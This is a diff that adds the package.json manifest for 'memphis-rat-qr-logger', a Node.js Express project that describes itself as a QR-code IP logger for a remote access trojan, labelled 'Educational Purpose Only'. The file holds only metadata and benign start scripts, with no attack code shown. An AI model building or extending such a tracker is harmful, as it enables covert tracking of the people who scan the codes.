@@ -1,0 +1,25 @@
+{
+  "name": "memphis-rat-qr-logger",
+  "version": "2.0.0",
+  "description": "QR Code IP Logger for Memphis RAT - Educational Purpose Only",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "dev": "node index.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "cors": "^2.8.5"
+  },
+  "engines": {
+    "node": "18.x"
+  },
+  "author": "Memphis RAT",
+  "license": "MIT",
+  "keywords": [
+    "ip-logger",
+    "qr-code",
+    "tracking",
+    "educational"
+  ]
+}
